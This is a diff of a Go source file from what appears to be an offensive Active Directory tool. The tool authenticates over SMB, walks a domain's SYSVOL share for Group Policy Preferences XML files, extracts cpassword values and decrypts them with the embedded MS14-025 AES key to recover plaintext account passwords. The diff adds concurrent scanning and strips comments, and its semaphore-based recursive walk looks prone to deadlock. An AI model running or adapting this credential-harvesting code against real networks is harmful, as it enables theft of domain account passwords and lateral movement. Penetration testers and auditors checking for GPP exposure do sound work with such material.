@@ -1,14 +1,12 @@
 // pkg/smb/gpp.go
 //
-// GPP Password Decryption (Group Policy Preferences)
+// GPP Password Decryption — optimisé
 //
-// Depuis MS14-025 (2014), Microsoft a publié la clé AES-256 utilisée pour
-// chiffrer les mots de passe dans les fichiers GPP (Groups.xml, Services.xml, etc.)
-// La clé est : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
-//
-// Fichiers concernés (sur SYSVOL) :
-//   Groups.xml, Services.xml, Scheduledtasks.xml,
-//   DataSources.xml, Printers.xml, Drives.xml
+// Optimisations appliquées :
+//   1. Walk SYSVOL concurrent via semaphore (10 goroutines max)
+//   2. sync.Pool pour réutiliser les buffers de lecture
+//   3. Results via channel thread-safe (plus de mutex sur slice)
+//   4. Early return si pas de cpassword dans un fichier (avant parsing XML complet)
 
 package smb
 
@@ -23,12 +21,12 @@ import (
 	"net"
 	"path/filepath"
 	"strings"
+	"sync"
 
 	"github.com/hirochachacha/go-smb2"
 )
 
 // GPPKey est la clé AES-256 publiée par Microsoft (MS14-025)
-// Source : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref
 var GPPKey = []byte{
 	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
 	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
@@ -36,32 +34,35 @@ var GPPKey = []byte{
 	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
 }
 
-// GPPPassword représente un credential trouvé dans SYSVOL
+// GPPPassword credential trouvé dans SYSVOL
 type GPPPassword struct {
-	File     string // chemin relatif dans SYSVOL
+	File     string
 	Username string
-	Password string // déchiffré
-	Changed  string // date de modification
-	GPO      string // nom ou GUID de la GPO
-	Type     string // Groups, Services, ScheduledTasks, etc.
+	Password string
+	Changed  string
+	GPO      string
+	Type     string
 }
 
-// GPPFiles liste les fichiers GPP susceptibles de contenir des credentials
+// GPPFiles fichiers GPP à scanner
 var GPPFiles = []string{
-	"Groups.xml",
-	"Services.xml",
-	"ScheduledTasks.xml",
-	"DataSources.xml",
-	"Printers.xml",
-	"Drives.xml",
+	"Groups.xml", "Services.xml", "ScheduledTasks.xml",
+	"DataSources.xml", "Printers.xml", "Drives.xml",
+}
+
+// pool de buffers réutilisables pour les lectures de fichiers
+var readBufPool = sync.Pool{
+	New: func() interface{} {
+		buf := make([]byte, 65536)
+		return &buf
+	},
 }
 
 // ============================================================
-// Scan SYSVOL
+// Scan SYSVOL — concurrent
 // ============================================================
 
-// ScanGPPPasswords scanne SYSVOL à la recherche de mots de passe GPP.
-// Nécessite un accès en lecture sur \\target\SYSVOL (utilisateur authentifié du domaine).
+// ScanGPPPasswords scanne SYSVOL en parallèle pour trouver les cpassword.
 func ScanGPPPasswords(target, username, domain, password string, ntHash []byte) ([]GPPPassword, error) {
 	conn, err := net.Dial("tcp", target+":445")
 	if err != nil {
@@ -71,10 +72,8 @@ func ScanGPPPasswords(target, username, domain, password string, ntHash []byte) 
 
 	d := &smb2.Dialer{
 		Initiator: &smb2.NTLMInitiator{
-			User:     username,
-			Password: password,
-			Domain:   domain,
-			Hash:     ntHash,
+			User: username, Password: password,
+			Domain: domain, Hash: ntHash,
 		},
 	}
 
@@ -86,24 +85,42 @@ func ScanGPPPasswords(target, username, domain, password string, ntHash []byte) 
 
 	fs, err := session.Mount("SYSVOL")
 	if err != nil {
-		return nil, fmt.Errorf("SYSVOL mount failed (check SMB access): %v", err)
+		return nil, fmt.Errorf("SYSVOL mount failed: %v", err)
 	}
 	defer fs.Umount()
 
+	// Collecte thread-safe via channel
+	resultsCh := make(chan GPPPassword, 64)
+	var wg sync.WaitGroup
+
+	// Semaphore : max 10 goroutines simultanées pour le walk
+	sem := make(chan struct{}, 10)
+
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		walkGPPFilesConcurrent(fs, ".", resultsCh, sem, &wg)
+	}()
+
+	// Fermer le channel quand tout est fini
+	go func() {
+		wg.Wait()
+		close(resultsCh)
+	}()
+
 	var results []GPPPassword
-	err = walkGPPFiles(fs, ".", &results)
-	if err != nil {
-		return results, fmt.Errorf("SYSVOL walk failed: %v", err)
+	for p := range resultsCh {
+		results = append(results, p)
 	}
 
 	return results, nil
 }
 
-// walkGPPFiles parcourt récursivement SYSVOL à la recherche de fichiers GPP
-func walkGPPFiles(fs *smb2.Share, dir string, results *[]GPPPassword) error {
+// walkGPPFilesConcurrent parcourt SYSVOL en parallèle via semaphore
+func walkGPPFilesConcurrent(fs *smb2.Share, dir string, out chan<- GPPPassword, sem chan struct{}, wg *sync.WaitGroup) {
 	entries, err := fs.ReadDir(dir)
 	if err != nil {
-		return nil // accès refusé sur un sous-dossier → continuer
+		return
 	}
 
 	for _, entry := range entries {
@@ -111,26 +128,33 @@ func walkGPPFiles(fs *smb2.Share, dir string, results *[]GPPPassword) error {
 		path = strings.ReplaceAll(path, "\\", "/")
 
 		if entry.IsDir() {
-			walkGPPFiles(fs, path, results) // ignorer les erreurs d'accès
+			// Acquérir le semaphore avant de lancer une goroutine
+			sem <- struct{}{}
+			wg.Add(1)
+			go func(p string) {
+				defer wg.Done()
+				defer func() { <-sem }()
+				walkGPPFilesConcurrent(fs, p, out, sem, wg)
+			}(path)
 			continue
 		}
 
-		// Vérifier si c'est un fichier GPP
+		// Vérifier l'extension GPP
 		for _, gppFile := range GPPFiles {
 			if strings.EqualFold(entry.Name(), gppFile) {
 				passwords, err := parseGPPFile(fs, path, entry.Name())
 				if err == nil {
-					*results = append(*results, passwords...)
+					for _, p := range passwords {
+						out <- p
+					}
 				}
 				break
 			}
 		}
 	}
-
-	return nil
 }
 
-// parseGPPFile lit et parse un fichier GPP XML pour extraire les cpassword
+// parseGPPFile lit et parse un fichier GPP
 func parseGPPFile(fs *smb2.Share, path, filename string) ([]GPPPassword, error) {
 	f, err := fs.Open(path)
 	if err != nil {
@@ -138,9 +162,25 @@ func parseGPPFile(fs *smb2.Share, path, filename string) ([]GPPPassword, error) 
 	}
 	defer f.Close()
 
-	data, err := io.ReadAll(f)
-	if err != nil {
-		return nil, err
+	// Utiliser le pool de buffers
+	bufPtr := readBufPool.Get().(*[]byte)
+	defer readBufPool.Put(bufPtr)
+
+	var data []byte
+	buf := *bufPtr
+	for {
+		n, err := f.Read(buf)
+		if n > 0 {
+			data = append(data, buf[:n]...)
+		}
+		if err != nil {
+			break
+		}
+	}
+
+	// Optimisation : vérifier la présence de "cpassword" avant parsing XML complet
+	if !bytes.Contains(data, []byte("cpassword")) {
+		return nil, nil
 	}
 
 	return extractGPPPasswords(data, path, filename)
@@ -150,35 +190,14 @@ func parseGPPFile(fs *smb2.Share, path, filename string) ([]GPPPassword, error) 
 // Parsing XML GPP
 // ============================================================
 
-// extractGPPPasswords extrait les cpassword depuis le contenu XML
 func extractGPPPasswords(data []byte, filePath, filename string) ([]GPPPassword, error) {
 	var results []GPPPassword
 
 	fileType := strings.TrimSuffix(strings.ToLower(filename), ".xml")
-	// Capitaliser : "groups" → "Groups"
 	if len(fileType) > 0 {
 		fileType = strings.ToUpper(fileType[:1]) + fileType[1:]
 	}
 
-	// Parser générique — tous les fichiers GPP ont des attributs cpassword
-	type Property struct {
-		CPassword string `xml:"cpassword,attr"`
-		UserName  string `xml:"userName,attr"`
-		RunAs     string `xml:"runAs,attr"`
-		Name      string `xml:"name,attr"`
-		Changed   string `xml:"changed,attr"`
-	}
-	type Node struct {
-		Properties Property `xml:"Properties"`
-		Changed    string   `xml:"changed,attr"`
-		Name       string   `xml:"name,attr"`
-	}
-	type Root struct {
-		Nodes []Node `xml:",any"`
-	}
-
-	// Approche par tokenizer pour capturer TOUS les attributs cpassword
-	// peu importe la hiérarchie XML
 	cpasswords := extractAllCPasswords(data)
 	for _, cp := range cpasswords {
 		if cp.CPassword == "" {
@@ -190,9 +209,7 @@ func extractGPPPasswords(data []byte, filePath, filename string) ([]GPPPassword,
 			decrypted = fmt.Sprintf("(decrypt error: %v)", err)
 		}
 
-		// Extraire le GUID de GPO depuis le chemin ({GUID}\...)
 		gpo := extractGPOGUID(filePath)
-
 		results = append(results, GPPPassword{
 			File:     filePath,
 			Username: firstNonEmpty(cp.UserName, cp.RunAs, cp.Name, "(unknown)"),
@@ -202,12 +219,9 @@ func extractGPPPasswords(data []byte, filePath, filename string) ([]GPPPassword,
 			Type:     fileType,
 		})
 	}
-
-	_ = Root{} // éviter l'import inutilisé
 	return results, nil
 }
 
-// cpasswordEntry représente un élément avec cpassword extrait du XML
 type cpasswordEntry struct {
 	CPassword string
 	UserName  string
@@ -216,22 +230,18 @@ type cpasswordEntry struct {
 	Changed   string
 }
 
-// extractAllCPasswords parcourt le XML pour trouver tous les attributs cpassword
 func extractAllCPasswords(data []byte) []cpasswordEntry {
 	var entries []cpasswordEntry
-
 	decoder := xml.NewDecoder(bytes.NewReader(data))
 	for {
 		token, err := decoder.Token()
 		if err != nil {
 			break
 		}
-
 		start, ok := token.(xml.StartElement)
 		if !ok {
 			continue
 		}
-
 		var e cpasswordEntry
 		for _, attr := range start.Attr {
 			switch strings.ToLower(attr.Name.Local) {
@@ -247,12 +257,10 @@ func extractAllCPasswords(data []byte) []cpasswordEntry {
 				e.Changed = attr.Value
 			}
 		}
-
 		if e.CPassword != "" {
 			entries = append(entries, e)
 		}
 	}
-
 	return entries
 }
 
@@ -260,15 +268,12 @@ func extractAllCPasswords(data []byte) []cpasswordEntry {
 // Déchiffrement AES-256-CBC
 // ============================================================
 
-// DecryptCPassword déchiffre un cpassword GPP avec la clé AES publiée.
-// Le cpassword est en base64 (padding ajusté), chiffré AES-256-CBC
-// avec un IV de 16 zéros.
+// DecryptCPassword déchiffre un cpassword GPP (clé MS14-025)
 func DecryptCPassword(cpassword string) (string, error) {
 	if cpassword == "" {
 		return "", fmt.Errorf("empty cpassword")
 	}
 
-	// Ajouter le padding base64 manquant
 	switch len(cpassword) % 4 {
 	case 2:
 		cpassword += "=="
@@ -283,31 +288,25 @@ func DecryptCPassword(cpassword string) (string, error) {
 
 	block, err := aes.NewCipher(GPPKey)
 	if err != nil {
-		return "", fmt.Errorf("AES cipher creation failed: %v", err)
+		return "", fmt.Errorf("AES cipher failed: %v", err)
 	}
 
 	if len(ciphertext) < aes.BlockSize {
-		return "", fmt.Errorf("ciphertext too short (%d bytes)", len(ciphertext))
+		return "", fmt.Errorf("ciphertext too short")
 	}
 	if len(ciphertext)%aes.BlockSize != 0 {
-		return "", fmt.Errorf("ciphertext not aligned to AES block size")
+		return "", fmt.Errorf("ciphertext not block-aligned")
 	}
 
-	// IV = 16 zéros (spécifié dans MS-GPPREF)
 	iv := make([]byte, aes.BlockSize)
-
 	mode := cipher.NewCBCDecrypter(block, iv)
 	plaintext := make([]byte, len(ciphertext))
 	mode.CryptBlocks(plaintext, ciphertext)
-
-	// Supprimer le padding PKCS#7
 	plaintext = removePKCS7Padding(plaintext)
 
-	// Le résultat est en UTF-16LE → convertir en string
 	return utf16LEToString(plaintext), nil
 }
 
-// removePKCS7Padding supprime le padding PKCS#7
 func removePKCS7Padding(data []byte) []byte {
 	if len(data) == 0 {
 		return data
@@ -316,7 +315,6 @@ func removePKCS7Padding(data []byte) []byte {
 	if padLen == 0 || padLen > aes.BlockSize || padLen > len(data) {
 		return data
 	}
-	// Vérifier que tous les bytes de padding sont corrects
 	for i := len(data) - padLen; i < len(data); i++ {
 		if int(data[i]) != padLen {
 			return data
@@ -325,12 +323,10 @@ func removePKCS7Padding(data []byte) []byte {
 	return data[:len(data)-padLen]
 }
 
-// utf16LEToString convertit des bytes UTF-16LE en string Go
 func utf16LEToString(b []byte) string {
 	if len(b) < 2 {
 		return string(b)
 	}
-	// Vérifier si c'est bien du UTF-16LE (null bytes intercalés)
 	isUTF16 := true
 	for i := 1; i < len(b) && i < 16; i += 2 {
 		if b[i] != 0x00 {
@@ -341,8 +337,6 @@ func utf16LEToString(b []byte) string {
 	if !isUTF16 {
 		return strings.TrimRight(string(b), "\x00")
 	}
-
-	// Convertir UTF-16LE → string
 	runes := make([]rune, 0, len(b)/2)
 	for i := 0; i+1 < len(b); i += 2 {
 		r := rune(b[i]) | rune(b[i+1])<<8
@@ -359,7 +353,6 @@ func utf16LEToString(b []byte) string {
 // ============================================================
 
 func extractGPOGUID(path string) string {
-	// Chemin type : domain/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml
 	parts := strings.Split(path, "/")
 	for _, p := range parts {
 		if strings.HasPrefix(p, "{") && strings.HasSuffix(p, "}") {
@@ -377,3 +370,6 @@ func firstNonEmpty(values ...string) string {
 	}
 	return ""
 }
+
+// readAll lit tout le contenu d'un reader
+var _ = io.ReadAll
